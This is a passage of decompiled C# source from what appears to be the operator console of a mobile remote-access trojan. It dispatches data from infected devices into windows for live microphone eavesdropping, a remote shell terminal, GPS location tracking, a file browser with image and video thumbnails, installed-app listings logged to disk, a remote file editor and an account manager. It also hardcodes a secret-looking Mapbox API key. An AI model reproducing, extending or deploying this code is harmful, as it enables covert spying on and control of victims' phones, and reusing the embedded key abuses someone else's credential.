											_0024VB_0024ResumableLocal_ob_0024390 = GetCollection(_0024VB_0024ResumableLocal_SPL_0024389[1]);
											_0024VB_0024ResumableLocal_clas_0024391 = (Client)_0024VB_0024ResumableLocal_ob_0024390[0];
											_0024VB_0024ResumableLocal_handle_0024392 = "Microphone_" + _0024VB_0024ResumableLocal_clas_0024391.ClientRemoteAddress;
											_0024VB_0024ResumableLocal_Microphone_0024393 = (Microphone)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024392];
											if (_0024VB_0024ResumableLocal_Microphone_0024393 != null)
											{
												_0024VB_0024ResumableLocal_Microphone_0024393.classWaveIn = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
												_0024VB_0024ResumableLocal_Microphone_0024393.classWaveIn.shot = false;
												_0024VB_0024ResumableLocal_Microphone_0024393.ClientWaveIn = _0024VB_0024ResumableLocal_Client_00243;
												_0024VB_0024ResumableLocal_Microphone_0024393.rateInput = Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_0024389[2].Trim());
												_0024VB_0024ResumableLocal_Microphone_0024393.In_Start(_0024VB_0024ResumableLocal_Microphone_0024393.MDeviceId);
											}
										}
										catch (Exception ex119)
										{
											ProjectData.SetProjectError(ex119);
											Exception ex120 = ex119;
											_0024VB_0024ResumableLocal_ex_0024394 = ex120;
											ProjectData.ClearProjectError();
										}
									}
									else if (Operators.CompareString(_0024S186, SecurityKey.MicwaveOutByte, TextCompare: false) == 0)
									{
										if (!_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.qit)
											try
											{
												_0024VB_0024ResumableLocal_SPL_0024395 = _0024VB_0024ResumableLocal_EncodString_00246.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
												_0024VB_0024ResumableLocal_ob_0024396 = GetCollection(_0024VB_0024ResumableLocal_SPL_0024395[1]);
												_0024VB_0024ResumableLocal_handle_0024397 = "Microphone_" + ((Client)_0024VB_0024ResumableLocal_ob_0024396[0]).ClientRemoteAddress;
												_0024VB_0024ResumableLocal_Microphone_0024398 = (Microphone)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024397];
												if (_0024VB_0024ResumableLocal_Microphone_0024398 == null)
												{
													_0024VB_0024ResumableLocal_Microphone_0024398 = new Microphone();
													_0024VB_0024ResumableLocal_Microphone_0024398.Name = _0024VB_0024ResumableLocal_handle_0024397;
													_0024VB_0024ResumableLocal_Microphone_0024398.Title = string.Format("{0} - IP:{1}", "Microphone", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
													_0024VB_0024ResumableLocal_Microphone_0024398.Show();
												}
												if (_0024VB_0024ResumableLocal_Microphone_0024398.waveOut == null)
												{
													_0024VB_0024ResumableLocal_Microphone_0024398.classClient = (Client)_0024VB_0024ResumableLocal_ob_0024396[0];
													_0024VB_0024ResumableLocal_Microphone_0024398.Client = (TcpClient)_0024VB_0024ResumableLocal_ob_0024396[1];
													_0024VB_0024ResumableLocal_Microphone_0024398.ClientWaveOut = _0024VB_0024ResumableLocal_Client_00243;
													_0024VB_0024ResumableLocal_Microphone_0024398.classWaveOut = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
													_0024VB_0024ResumableLocal_Microphone_0024398.classWaveOut.shot = false;
													try
													{
														_0024VB_0024ResumableLocal_Microphone_0024398.waveOut = new WaveOut(0);
														_0024VB_0024ResumableLocal_Microphone_0024398.waveOut.Open(reso.FormatWave(Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_0024395[2])));
													}
													catch (Exception ex121)
													{
														ProjectData.SetProjectError(ex121);
														Exception ex122 = ex121;
														_0024VB_0024ResumableLocal_ex_0024399 = ex122;
														_0024VB_0024ResumableLocal_Microphone_0024398.Out_Stop();
														_0024VB_0024ResumableLocal_Microphone_0024398.Panel1.Visible = false;
														_0024VB_0024ResumableLocal_Microphone_0024398.SizeH();
														ProjectData.ClearProjectError();
													}
													_0024VB_0024ResumableLocal_Microphone_0024398.OutHZ.Text = reso.HzString(Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_0024395[2]));
													_0024VB_0024ResumableLocal_Microphone_0024398.OutBoxSource.SelectedIndex = Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_0024395[3].Trim());
													if (Operators.ConditionalCompareObjectEqual(_0024VB_0024ResumableLocal_Microphone_0024398.b_sta.Tag, 1, TextCompare: false))
													{
														_0024VB_0024ResumableLocal_Microphone_0024398.b_sta.Tag = 2;
														_0024VB_0024ResumableLocal_Microphone_0024398.b_sta.Text = "Stop Microphone";
													}
												}
												_0024VB_0024ResumableLocal_Byte__0024400 = (byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1);
												if (_0024VB_0024ResumableLocal_Microphone_0024398 != null && _0024VB_0024ResumableLocal_Microphone_0024398.waveOut != null)
													_0024VB_0024ResumableLocal_Microphone_0024398.waveOut.Write(_0024VB_0024ResumableLocal_Byte__0024400);
											}
											catch (Exception ex123)
											{
												ProjectData.SetProjectError(ex123);
												Exception ex124 = ex123;
												_0024VB_0024ResumableLocal_ex_0024401 = ex124;
												ProjectData.ClearProjectError();
											}
									}
									else if (Operators.CompareString(_0024S186, SecurityKey.getCommand, TextCompare: false) == 0)
									{
										try
										{
											_0024VB_0024ResumableLocal_SPL_0024402 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
											_0024VB_0024ResumableLocal_SPL_lines_0024403 = _0024VB_0024ResumableLocal_SPL_0024402[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
											_0024VB_0024ResumableLocal_handle_0024404 = "Shell_Terminal_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
											_0024VB_0024ResumableLocal_ShellTerminal_0024405 = (ShellTerminal)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024404];
											if (_0024VB_0024ResumableLocal_ShellTerminal_0024405 == null)
											{
												_0024VB_0024ResumableLocal_ShellTerminal_0024405 = new ShellTerminal();
												_0024VB_0024ResumableLocal_ShellTerminal_0024405.Name = _0024VB_0024ResumableLocal_handle_0024404;
												_0024VB_0024ResumableLocal_ShellTerminal_0024405.Title = string.Format("{0} - IP:{1}", "Shell Terminal", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
												_0024VB_0024ResumableLocal_ShellTerminal_0024405.Client = _0024VB_0024ResumableLocal_Client_00243;
												_0024VB_0024ResumableLocal_ShellTerminal_0024405.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
												_0024VB_0024ResumableLocal_ShellTerminal_0024405.Show();
											}
											_0024VB_0024ResumableLocal_ShellTerminal_0024405.ignore = true;
											_0024VB_0024ResumableLocal_ShellTerminal_0024405.OutText.DeselectAll();
											_0024VB_0024ResumableLocal_isLine_0024406 = false;
											_0024VB_0024ResumableLocal_EV_0024407 = "[Output value : " + _0024VB_0024ResumableLocal_SPL_0024402[2] + "]";
											_0024VB_0024ResumableLocal_ShellTerminal_0024405.OutText.AppendText(_0024VB_0024ResumableLocal_EV_0024407);
											_0024VB_0024ResumableLocal_Counter_0024408 = 0;
											_0024S409 = _0024VB_0024ResumableLocal_SPL_lines_0024403;
											for (_0024S410 = 0; _0024S410 < _0024S409.Length; _0024S410++)
											{
												_0024VB_0024ResumableLocal_ea_0024411 = _0024S409[_0024S410];
												if (_0024VB_0024ResumableLocal_ShellTerminal_0024405.OutText.Lines.Length > 0)
												{
													_0024VB_0024ResumableLocal_ShellTerminal_0024405.OutText.AppendText("\r\n" + _0024VB_0024ResumableLocal_ea_0024411);
													_0024VB_0024ResumableLocal_isLine_0024406 = true;
												}
												else
												{
													_0024VB_0024ResumableLocal_ShellTerminal_0024405.OutText.AppendText(_0024VB_0024ResumableLocal_ea_0024411 + "\r\n");
													_0024VB_0024ResumableLocal_isLine_0024406 = false;
												}
												_0024VB_0024ResumableLocal_ShellTerminal_0024405.PB.Value = Codes.RateConverter(_0024VB_0024ResumableLocal_Counter_0024408, _0024VB_0024ResumableLocal_SPL_lines_0024403.Length - 1);
												_0024VB_0024ResumableLocal_Counter_0024408++;
												Application.DoEvents();
											}
											_0024VB_0024ResumableLocal_ShellTerminal_0024405.PB.Value = 0;
											_0024VB_0024ResumableLocal_ShellTerminal_0024405.ignore = false;
											_0024VB_0024ResumableLocal_ShellTerminal_0024405.NewTag(_0024VB_0024ResumableLocal_isLine_0024406);
											_0024VB_0024ResumableLocal_ShellTerminal_0024405.OutText.ReadOnly = false;
											if (_0024VB_0024ResumableLocal_ShellTerminal_0024405.IAMNew)
												_0024VB_0024ResumableLocal_ShellTerminal_0024405.IAMNew = false;
										}
										catch (Exception ex125)
										{
											ProjectData.SetProjectError(ex125);
											Exception ex126 = ex125;
											_0024VB_0024ResumableLocal_ex_0024412 = ex126;
											ProjectData.ClearProjectError();
										}
									}
									else if (Operators.CompareString(_0024S186, SecurityKey.getGSM, TextCompare: false) != 0)
									{
										if (Operators.CompareString(_0024S186, SecurityKey.getGPS, TextCompare: false) == 0)
										{
											if (!_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.qitGPS)
												try
												{
													_0024VB_0024ResumableLocal_SPL_0024413 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
													_0024VB_0024ResumableLocal_handle_0024414 = "Location_Manager_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
													_0024VB_0024ResumableLocal_LocationManager_0024415 = (LocationManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024414];
													if (_0024VB_0024ResumableLocal_LocationManager_0024415 == null)
													{
														reso.Directory_Exist(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient);
														_0024VB_0024ResumableLocal_LocationManager_0024415 = new LocationManager();
														_0024VB_0024ResumableLocal_LocationManager_0024415.infoMaps = new string[2]
														{
															_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER,
															_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName
														};
														_0024VB_0024ResumableLocal_LocationManager_0024415.Name = _0024VB_0024ResumableLocal_handle_0024414;
														_0024VB_0024ResumableLocal_LocationManager_0024415.Title = string.Format("{0} - IP:{1}", "Location Manager", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
														_0024VB_0024ResumableLocal_LocationManager_0024415.Client = _0024VB_0024ResumableLocal_Client_00243;
														_0024VB_0024ResumableLocal_LocationManager_0024415.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
														_0024VB_0024ResumableLocal_LocationManager_0024415.Show();
														_0024VB_0024ResumableLocal_LocationManager_0024415.Zoom = 15;
													}
													_0024VB_0024ResumableLocal_LocationManager_0024415.ImageSize.Width = 480;
													_0024VB_0024ResumableLocal_LocationManager_0024415.ImageSize.Height = 360;
													_0024VB_0024ResumableLocal_LocationManager_0024415.Markers = reso.Between("<param name=\"markers_gps\">", "</param>");
													_0024VB_0024ResumableLocal_LocationManager_0024415.Link = "https://api.mapbox.com/styles/v1/";
													_0024VB_0024ResumableLocal_LocationManager_0024415.Key = "sk.eyJ1IjoiY3lwaGVycmF0bmV3IiwiYSI6ImNrcHdvZWJxbDB5NXAydm56dmhpYWtjZHIifQ.-PWp8lHBTFP7s7fouo6-KQ";
													_0024VB_0024ResumableLocal_get_style_0024416 = reso.Maps_style();
													_0024VB_0024ResumableLocal_LocationManager_0024415.style = reso.Between("<param name=\"" + _0024VB_0024ResumableLocal_get_style_0024416 + "\">", "</param>");
													_0024VB_0024ResumableLocal_LocationManager_0024415.Accuracy = _0024VB_0024ResumableLocal_SPL_0024413[2];
													_0024VB_0024ResumableLocal_LocationManager_0024415.Speed = Codes.GetSpeed(_0024VB_0024ResumableLocal_SPL_0024413[3]);
													_0024VB_0024ResumableLocal_LocationManager_0024415.List.Add(new double[2]
													{
														Conversions.ToDouble(_0024VB_0024ResumableLocal_SPL_0024413[0]),
														Conversions.ToDouble(_0024VB_0024ResumableLocal_SPL_0024413[1])
													});
												}
												catch (Exception ex127)
												{
													ProjectData.SetProjectError(ex127);
													Exception ex128 = ex127;
													_0024VB_0024ResumableLocal_ex_0024417 = ex128;
													ProjectData.ClearProjectError();
												}
										}
										else if (Operators.CompareString(_0024S186, checkforview(_0024VB_0024ResumableLocal_getCase_00247), TextCompare: false) == 0)
										{
											try
											{
												if (!_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.qit)
												{
													_0024VB_0024ResumableLocal_SPL_0024418 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(0)).Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
													_0024VB_0024ResumableLocal_casedata_0024419 = _0024VB_0024ResumableLocal_getCase_00247.Split('>');
													_0024VB_0024ResumableLocal_Targetuuid_0024420 = _0024VB_0024ResumableLocal_casedata_0024419[1];
													_0024VB_0024ResumableLocal_Byte_compressd_0024421 = (byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1);
													_0024VB_0024ResumableLocal_MS_0024422 = new MemoryStream(_0024VB_0024ResumableLocal_Byte_compressd_0024421);
													try
													{
														_0024VB_0024ResumableLocal_img_0024423 = Image.FromStream(_0024VB_0024ResumableLocal_MS_0024422);
														try
														{
															_0024VB_0024ResumableLocal__image_0024424 = new Bitmap(_0024VB_0024ResumableLocal_img_0024423);
															try
															{
																Filenamethum = _0024VB_0024ResumableLocal_SPL_0024418[1].Substring(_0024VB_0024ResumableLocal_SPL_0024418[1].LastIndexOf("/") + 1);
																_0024VB_0024ResumableLocal_Thepath_is_0024425 = _0024VB_0024ResumableLocal_SPL_0024418[1].Substring(0, _0024VB_0024ResumableLocal_SPL_0024418[1].LastIndexOf("/"));
																if (_0024VB_0024ResumableLocal_Thepath_is_0024425.StartsWith(" "))
																	_0024VB_0024ResumableLocal_Thepath_is_0024425 = _0024VB_0024ResumableLocal_Thepath_is_0024425.Substring(1, _0024VB_0024ResumableLocal_Thepath_is_0024425.Length);
																_0024VB_0024ResumableLocal_down_0024426 = null;
																try
																{
																	_0024S427 = Application.OpenForms.GetEnumerator();
																	while (_0024S427.MoveNext())
																	{
																		_0024VB_0024ResumableLocal_frm_0024428 = (Form)_0024S427.Current;
																		if (_0024VB_0024ResumableLocal_frm_0024428 != null && _0024VB_0024ResumableLocal_frm_0024428.Tag != null && Operators.CompareString(_0024VB_0024ResumableLocal_frm_0024428.Tag.ToString(), _0024VB_0024ResumableLocal_Targetuuid_0024420, TextCompare: false) == 0)
																		{
																			_0024VB_0024ResumableLocal_Target_form_0024429 = (FileManager)_0024VB_0024ResumableLocal_frm_0024428;
																			_0024VB_0024ResumableLocal_down_0024426 = _0024VB_0024ResumableLocal_Target_form_0024429.classClient.FolderUSER + "\\Thumbs" + _0024VB_0024ResumableLocal_Thepath_is_0024425.Replace("/", "\\");
																			break;
																		}
																	}
																}
																finally
																{
																	if (num < 0 && _0024S427 is IDisposable)
																		(_0024S427 as IDisposable).Dispose();
																}
																if ((_0024VB_0024ResumableLocal_down_0024426 == null) | (_0024VB_0024ResumableLocal_Target_form_0024429 == null))
																	_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
																else
																{
																	if (_0024VB_0024ResumableLocal_Target_form_0024429.viwimage.Image != null)
																	{
																		_0024VB_0024ResumableLocal_Target_form_0024429.viwimage.Image.Dispose();
																		_0024VB_0024ResumableLocal_Target_form_0024429.viwimage.Image = null;
																	}
																	_0024VB_0024ResumableLocal_Target_form_0024429.viwimage.Image = new Bitmap(_0024VB_0024ResumableLocal__image_0024424);
																	if (!_0024VB_0024ResumableLocal_Target_form_0024429.viwimage.Visible)
																		_0024VB_0024ResumableLocal_Target_form_0024429.viwimage.Visible = true;
																	Thumbs = _0024VB_0024ResumableLocal_down_0024426;
																	if (!Directory.Exists(Thumbs))
																		Directory.CreateDirectory(Thumbs);
																	try
																	{
																		if (!_0024VB_0024ResumableLocal_Target_form_0024429.IsDisposed)
																		{
																			if (Filenamethum.Substring(Filenamethum.Trim().LastIndexOf("/") + 1).EndsWith(".mp4"))
																			{
																				SaveVideo(Thumbs, Filenamethum.Substring(Filenamethum.Trim().LastIndexOf("/") + 1), _0024VB_0024ResumableLocal__image_0024424);
																				if (!_0024VB_0024ResumableLocal_Target_form_0024429.ShowVideo)
																				{
																					_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
																					_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Close(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.myClient);
																					_0024VB_0024ResumableLocal__image_0024424.Dispose();
																				}
																			}
																			else
																			{
																				_0024VB_0024ResumableLocal_Target_form_0024429.viwimage.Image.Save(Thumbs + "\\" + Filenamethum.Substring(Filenamethum.Trim().LastIndexOf("/") + 1));
																				if (!_0024VB_0024ResumableLocal_Target_form_0024429.ShowVideo)
																				{
																					_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
																					_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Close(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.myClient);
																					_0024VB_0024ResumableLocal__image_0024424.Dispose();
																				}
																			}
																		}
																	}
																	catch (Exception ex129)
																	{
																		ProjectData.SetProjectError(ex129);
																		Exception ex130 = ex129;
																		_0024VB_0024ResumableLocal_ex_0024430 = ex130;
																		ProjectData.ClearProjectError();
																	}
																}
															}
															catch (Exception ex131)
															{
																ProjectData.SetProjectError(ex131);
																Exception ex132 = ex131;
																_0024VB_0024ResumableLocal_ex_0024431 = ex132;
																ProjectData.ClearProjectError();
															}
														}
														finally
														{
															if (num < 0 && _0024VB_0024ResumableLocal_img_0024423 != null)
																((IDisposable)_0024VB_0024ResumableLocal_img_0024423).Dispose();
														}
													}
													finally
													{
														if (num < 0 && _0024VB_0024ResumableLocal_MS_0024422 != null)
															((IDisposable)_0024VB_0024ResumableLocal_MS_0024422).Dispose();
													}
												}
											}
											catch (Exception ex133)
											{
												ProjectData.SetProjectError(ex133);
												Exception ex134 = ex133;
												_0024VB_0024ResumableLocal_ex_0024432 = ex134;
												ProjectData.ClearProjectError();
											}
										}
										else if (Operators.CompareString(_0024S186, SecurityKey.Apps, TextCompare: false) == 0)
										{
											try
											{
												_0024VB_0024ResumableLocal_SPL_0024433 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
												_0024VB_0024ResumableLocal_SPL_lines_0024434 = _0024VB_0024ResumableLocal_SPL_0024433[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
												_0024VB_0024ResumableLocal_handle_0024435 = "Applications_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
												_0024VB_0024ResumableLocal_Applications_0024436 = (Applications)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024435];
												if (_0024VB_0024ResumableLocal_Applications_0024436 == null)
												{
													_0024VB_0024ResumableLocal_Applications_0024436 = new Applications();
													_0024VB_0024ResumableLocal_Applications_0024436.Name = _0024VB_0024ResumableLocal_handle_0024435;
													_0024VB_0024ResumableLocal_Applications_0024436.Title = string.Format("{0} - IP:{1}", "Applications", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
													_0024VB_0024ResumableLocal_Applications_0024436.Client = _0024VB_0024ResumableLocal_Client_00243;
													_0024VB_0024ResumableLocal_Applications_0024436.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
													_0024VB_0024ResumableLocal_Applications_0024436.tmpAddressIP = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
													_0024VB_0024ResumableLocal_Applications_0024436.tmpClientName = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName;
													_0024VB_0024ResumableLocal_Applications_0024436.tmpCountry = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country;
													_0024VB_0024ResumableLocal_Applications_0024436.tmpFolderUSER = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER;
													_0024VB_0024ResumableLocal_Applications_0024436.DGV0.Columns[4].Width = 48;
													_0024VB_0024ResumableLocal_Applications_0024436.DGV0.Columns[4].DisplayIndex = 0;
													_0024VB_0024ResumableLocal_Applications_0024436.Show();
												}
												_0024VB_0024ResumableLocal_Applications_0024436.DGV0.Enabled = false;
												_0024VB_0024ResumableLocal_Applications_0024436.DGV0.Rows.Clear();
												_0024VB_0024ResumableLocal_Counter_0024437 = 0;
												_0024S438 = _0024VB_0024ResumableLocal_SPL_lines_0024434;
												for (_0024S439 = 0; _0024S439 < _0024S438.Length; _0024S439++)
												{
													_0024VB_0024ResumableLocal_ea_0024440 = _0024S438[_0024S439];
													_0024VB_0024ResumableLocal_ay_0024441 = _0024VB_0024ResumableLocal_ea_0024440.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
													_0024VB_0024ResumableLocal_getPath_0024442 = null;
													_0024S443 = _0024VB_0024ResumableLocal_ay_0024441[1].ToLower();
													string left2 = _0024S443;
													if (Operators.CompareString(left2, "system", TextCompare: false) != 0)
													{
														if (Operators.CompareString(left2, "user", TextCompare: false) != 0)
															_0024VB_0024ResumableLocal_getPath_0024442 = reso.res_Path + "\\Icons\\FillEllipse\\User.png";
														else
															_0024VB_0024ResumableLocal_getPath_0024442 = reso.res_Path + "\\Icons\\FillEllipse\\User.png";
													}
													else
														_0024VB_0024ResumableLocal_getPath_0024442 = reso.res_Path + "\\Icons\\FillEllipse\\System.png";
													if (_0024VB_0024ResumableLocal_ay_0024441.Length > 4 && Operators.CompareString(_0024VB_0024ResumableLocal_ay_0024441[4], "null", TextCompare: false) != 0)
													{
														_0024VB_0024ResumableLocal_appicon_0024444 = Codes.ResizeImage(new Bitmap(Codes.Base64ToImage(_0024VB_0024ResumableLocal_ay_0024441[4])), new Size(45, 45));
														_0024VB_0024ResumableLocal_index_0024445 = _0024VB_0024ResumableLocal_Applications_0024436.DGV0.Rows.Add(_0024VB_0024ResumableLocal_ay_0024441[0], _0024VB_0024ResumableLocal_ay_0024441[1], _0024VB_0024ResumableLocal_ay_0024441[2], _0024VB_0024ResumableLocal_ay_0024441[3], _0024VB_0024ResumableLocal_appicon_0024444);
													}
													else
														_0024VB_0024ResumableLocal_index_0024445 = _0024VB_0024ResumableLocal_Applications_0024436.DGV0.Rows.Add(_0024VB_0024ResumableLocal_ay_0024441[0], _0024VB_0024ResumableLocal_ay_0024441[1], _0024VB_0024ResumableLocal_ay_0024441[2], _0024VB_0024ResumableLocal_ay_0024441[3], reso.GetEllImage(0, new object[5] { _0024VB_0024ResumableLocal_getPath_0024442, 15, 15, 17, 17 }));
													if (Operators.CompareString(_0024VB_0024ResumableLocal_ay_0024441[2], _0024VB_0024ResumableLocal_SPL_0024433[2], TextCompare: false) == 0)
														_0024VB_0024ResumableLocal_Applications_0024436.DGV0.Rows[_0024VB_0024ResumableLocal_index_0024445].DefaultCellStyle.ForeColor = SpySettings.DefaultColor_NewColorFiles;
													_0024VB_0024ResumableLocal_Applications_0024436.PB.Value = Codes.RateConverter(_0024VB_0024ResumableLocal_Counter_0024437, _0024VB_0024ResumableLocal_SPL_lines_0024434.Length - 1);
													_0024VB_0024ResumableLocal_Counter_0024437++;
													Application.DoEvents();
												}
												_0024VB_0024ResumableLocal_Applications_0024436.DGV0.Enabled = true;
												_0024VB_0024ResumableLocal_Applications_0024436.PB.Value = 0;
												if (Operators.CompareString(SpySettings.SAVING_DATA, "Yes", TextCompare: false) == 0)
												{
													reso.Directory_Exist(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient);
													ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
													{
														reso.SAVEit((Array)a0);
													}, new object[8]
													{
														_0024VB_0024ResumableLocal_Applications_0024436.DGV0,
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER,
														"Applications",
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName,
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country + " - " + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP,
														"Applications",
														"log",
														DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
													});
												}
											}
											catch (Exception ex135)
											{
												ProjectData.SetProjectError(ex135);
												Exception ex136 = ex135;
												_0024VB_0024ResumableLocal_ex_0024446 = ex136;
												ProjectData.ClearProjectError();
											}
										}
										else if (Operators.CompareString(_0024S186, SecurityKey.editor, TextCompare: false) == 0)
										{
											try
											{
												_0024VB_0024ResumableLocal_SPL_0024447 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
												_0024VB_0024ResumableLocal_SPL_lines_0024448 = _0024VB_0024ResumableLocal_SPL_0024447[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
												_0024VB_0024ResumableLocal_handle_0024449 = "editor_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress + "_" + _0024VB_0024ResumableLocal_SPL_0024447[2].Replace(Strings.Space(1), "_");
												_0024VB_0024ResumableLocal_Editor_0024450 = (Editor)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024449];
												if (_0024VB_0024ResumableLocal_Editor_0024450 == null)
												{
													_0024VB_0024ResumableLocal_Editor_0024450 = new Editor();
													_0024VB_0024ResumableLocal_Editor_0024450.Name = _0024VB_0024ResumableLocal_handle_0024449;
													_0024VB_0024ResumableLocal_Editor_0024450.Title = string.Format("{0} - IP:{1}", "Editor", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
													_0024VB_0024ResumableLocal_Editor_0024450.Client = _0024VB_0024ResumableLocal_Client_00243;
													_0024VB_0024ResumableLocal_Editor_0024450.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
													_0024VB_0024ResumableLocal_Editor_0024450.path = _0024VB_0024ResumableLocal_SPL_0024447[2];
													_0024VB_0024ResumableLocal_Editor_0024450.EditText.Text = _0024VB_0024ResumableLocal_SPL_0024447[1];
													_0024VB_0024ResumableLocal_Editor_0024450.Show();
												}
											}
											catch (Exception ex137)
											{
												ProjectData.SetProjectError(ex137);
												Exception ex138 = ex137;
												_0024VB_0024ResumableLocal_ex_0024451 = ex138;
												ProjectData.ClearProjectError();
											}
										}
										else if (Operators.CompareString(_0024S186, SecurityKey.Account, TextCompare: false) == 0)
										{
											try
											{
												_0024VB_0024ResumableLocal_SPL_0024452 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
												_0024VB_0024ResumableLocal_SPL_lines_0024453 = _0024VB_0024ResumableLocal_SPL_0024452[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
												_0024VB_0024ResumableLocal_handle_0024454 = "Account_Manager_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
												_0024VB_0024ResumableLocal_AccountManager_0024455 = (AccountManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024454];
												if (_0024VB_0024ResumableLocal_AccountManager_0024455 == null)
												{
													_0024VB_0024ResumableLocal_AccountManager_0024455 = new AccountManager();
													_0024VB_0024ResumableLocal_AccountManager_0024455.Name = _0024VB_0024ResumableLocal_handle_0024454;
													_0024VB_0024ResumableLocal_AccountManager_0024455.Title = string.Format("{0} - IP:{1}", "Account Manager", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
													_0024VB_0024ResumableLocal_AccountManager_0024455.Client = _0024VB_0024ResumableLocal_Client_00243;
													_0024VB_0024ResumableLocal_AccountManager_0024455.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
													_0024VB_0024ResumableLocal_AccountManager_0024455.tmpAddressIP = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
